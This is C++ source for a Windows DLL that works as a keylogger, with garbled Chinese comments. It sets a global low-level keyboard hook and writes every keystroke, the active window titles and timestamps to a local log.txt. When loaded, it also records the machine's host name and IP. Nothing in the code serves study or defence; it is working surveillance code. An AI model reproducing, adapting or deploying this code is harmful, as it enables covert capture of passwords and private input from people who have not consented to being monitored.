#include <windows.h>
#include <iostream>
#pragma comment(lib, "wsock32.lib")

HHOOK g_hHook = NULL;
HMODULE g_hMod = NULL;
char g_szTitle[MAX_PATH] = { 0 };


BYTE GetASCII(BYTE bVKCode)
{
	// �ж�С����0-9����
	if (GetKeyState(VK_NUMLOCK))
	{
		if (bVKCode == '`')
		{
			bVKCode = '0';
			return((char)bVKCode);
		}
		else if (bVKCode >= 'a' && bVKCode <= 'i')
		{
			bVKCode = bVKCode - 'a' + 0x31;
			return((char)bVKCode);
		}
	}
	// �ж���Сд
	if (!GetKeyState(VK_CAPITAL) && (bVKCode >= 0x41 && bVKCode <= 0x5A))
	{
		bVKCode |= 0x20;
	}

	return((char)bVKCode);
}

BOOL SaveContent(const char* pcszContent)
{

	size_t nLen = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	char szBuf[MAX_PATH] = { 0 };
	DWORD dwWritten = 0;
	BOOL fOk = FALSE;
	BOOL fTime = FALSE;

	if (NULL == pcszContent)
	{
		return(FALSE);
	}
	GetCurrentDirectoryA(MAX_PATH, szBuf);
	strcat_s(szBuf, MAX_PATH, "\\log.txt");
	nLen = strlen(pcszContent);
	// ���Դ��ļ�
	hFile = CreateFileA(szBuf,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		// �޷��򿪳��Դ���
		hFile = CreateFileA(szBuf,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			return(FALSE);
		}
	}
	SetFilePointer(hFile, 0, NULL, FILE_END);
	fOk = WriteFile(hFile, pcszContent, nLen, &dwWritten, NULL);
	if (!fOk || nLen > dwWritten || !fTime)
	{
		CloseHandle(hFile);
		hFile = NULL;
		return(FALSE);
	}
	CloseHandle(hFile);
	hFile = NULL;

	return(TRUE);
}

//��ȡ����IP
void getIP()
{
	char* IP = new char[16];			//����IP
	char* HOSTNAME = new char[256];		//����������
	struct hostent* ph = 0;
	WSADATA w;
	WSAStartup(0x0101, &w);
	gethostname(HOSTNAME, 256);//��ȡ��������buff 
	ph = gethostbyname(HOSTNAME);
	IP = inet_ntoa(*((struct in_addr*)ph->h_addr_list[0]));//����IP
	WSACleanup();

	char content[100] = { 0 };
	sprintf_s(content, "HOST:%s IP:%s", HOSTNAME, IP);
	SaveContent(content);
}


BOOL GetPrefix(char* pszBuf, size_t nSize)
{
	HWND hWndForeground = NULL;
	char szCurWindowTitle[MAX_PATH] = { 0 };


	if (NULL == pszBuf)
	{
		return(FALSE);
	}
	RtlZeroMemory(pszBuf, nSize);

	hWndForeground = GetForegroundWindow();
	if (hWndForeground == NULL)
	{
		hWndForeground = GetDesktopWindow();
	}
	GetWindowTextA(hWndForeground, szCurWindowTitle, MAX_PATH);

	// ������˴���
	if (_stricmp(szCurWindowTitle, g_szTitle))
	{
		RtlZeroMemory(g_szTitle, MAX_PATH);
		strcpy_s(g_szTitle, MAX_PATH, szCurWindowTitle);
		strcpy_s(pszBuf, nSize, "[");
		strcat_s(pszBuf, nSize, g_szTitle);
		strcat_s(pszBuf, nSize, "]:\r\n\r\n");

		return(TRUE);
	}
	return(FALSE);
}

LRESULT CALLBACK LowLevelKeyboardProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	KBDLLHOOKSTRUCT stKbdHook = *(PKBDLLHOOKSTRUCT)lParam;
	DWORD dwVkCode = stKbdHook.vkCode;
	char szBuf[16] = { 0 };
	char szPrefix[MAX_PATH] = { 0 };

	if (nCode == HC_ACTION)
	{
		if (WM_KEYDOWN == wParam || WM_SYSKEYDOWN == wParam)
		{

			RtlZeroMemory(szBuf, 16);
			// ������[(0-9)(a-z)(A-Z)]
			if (dwVkCode >= 0x30 && dwVkCode <= 0x5A ||
				(dwVkCode >= 0x60 && dwVkCode <= 0x69) ||
				(dwVkCode >= 'a' && dwVkCode <= 'i') || dwVkCode == '`')
			{
				// ��ȡ��Ӧ��ASCII
				szBuf[0] = GetASCII(dwVkCode);
			}
			// ����F1-F24
			else if (dwVkCode >= 0x70 && dwVkCode <= 0x84)
			{
				int F_number = dwVkCode - 0x70 + 1;
				szBuf[0] = 'F';
				szBuf[1] = F_number;
				_itoa_s(F_number, &szBuf[1], 4, 10);
			}
			else
			{
				switch (dwVkCode)
				{
				case VK_LSHIFT: // shift��
				case VK_RSHIFT:
					strcpy_s(szBuf, sizeof(szBuf), "[Shift]");
					break;
				case VK_LCONTROL: // ctrl��
				case VK_RCONTROL:
					strcpy_s(szBuf, sizeof(szBuf), "[Ctrl]");
					break;
				case VK_MENU: // Alt��
					strcpy_s(szBuf, sizeof(szBuf), "[Ctrl]");
					break;
				case VK_ESCAPE: // ESC��
					strcpy_s(szBuf, sizeof(szBuf), "[Esc]");
					break;
				case VK_SPACE: // �ո��
					strcpy_s(szBuf, sizeof(szBuf), " ");
					break;
				case VK_DELETE: // delete��
					strcpy_s(szBuf, sizeof(szBuf), "[Delete]");
					break;
				case VK_RETURN: // �س���
					strcpy_s(szBuf, sizeof(szBuf), "\n");
					break;
				case VK_TAB: // tab��
					strcpy_s(szBuf, sizeof(szBuf), "\t");
					break;
				case VK_LWIN: // Win��
				case VK_RWIN: 
					strcpy_s(szBuf, sizeof(szBuf), "[Win]");
					break;
				case VK_BACK: // �˸��
					strcpy_s(szBuf, sizeof(szBuf), "[<--]");
					break;
				case VK_MULTIPLY: // �˷�
					strcpy_s(szBuf, sizeof(szBuf), "*");
					break;
				case VK_DIVIDE: // ����
					strcpy_s(szBuf, sizeof(szBuf), "/");
					break;
				case VK_ADD: // �ӷ�
					strcpy_s(szBuf, sizeof(szBuf), "+");
					break;
				case VK_SUBTRACT: // ����
					strcpy_s(szBuf, sizeof(szBuf), "-");
					break;

				default:
					break;
				}
			}
			// �������ڷ����˱任������µĵ�ǰ���ڱ�����ʾ
			if (GetPrefix(szPrefix, MAX_PATH))
			{
				//��ȡʱ���
				time_t curtime = time(NULL);
				tm* ctm = new tm();
				localtime_s(ctm, &curtime);
				char currentTime[64];
				sprintf_s(currentTime, "\r\n\r\n[%d/%02d/%02d %02d:%02d:%02d]  ", ctm->tm_year + 1900, ctm->tm_mon + 1,
					ctm->tm_mday, ctm->tm_hour, ctm->tm_min, ctm->tm_sec);
				SaveContent(currentTime);
				SaveContent(szPrefix);
			}
			// �����������д��Ҫ������ļ���
			SaveContent(szBuf);
		}
	}
	return(CallNextHookEx(g_hHook, nCode, wParam, lParam));
}

extern "C" __declspec(dllexport) BOOL SetKbdHook()
{
	BOOL fOk = FALSE;
	LRESULT lResult = 0;

	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hMod, 0);
	if (NULL == g_hHook)
	{
		return(FALSE);
	}

	return(TRUE);
}

extern "C" __declspec(dllexport) VOID UnhookKbdHook()
{
	if (NULL != g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		g_hMod = hModule;
		getIP();
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		break;
	}
	default:
	{
		break;
	}
	}
	return(TRUE);
}